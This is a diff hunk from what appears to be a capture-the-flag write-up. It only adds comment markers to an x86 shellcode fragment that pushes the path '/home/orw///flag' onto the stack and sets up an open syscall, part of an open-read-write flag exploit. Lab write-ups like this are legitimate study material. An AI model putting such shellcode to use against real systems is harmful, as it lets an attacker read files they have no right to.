@@ -12,10 +12,10 @@ super simple. here is the shellcode i wrote:
 
 ```asm
 push 0
-push 0x67616c66 "ag"
-push 0x2f2f2f77 "w/fl"
-push 0x726f2f65 "e/or"
-push 0x6d6f682f "/hom"
+push 0x67616c66 // "ag"
+push 0x2f2f2f77 // "w/fl"
+push 0x726f2f65 // "e/or"
+push 0x6d6f682f // "/hom"
 
 mov eax, 5
 mov ebx, esp
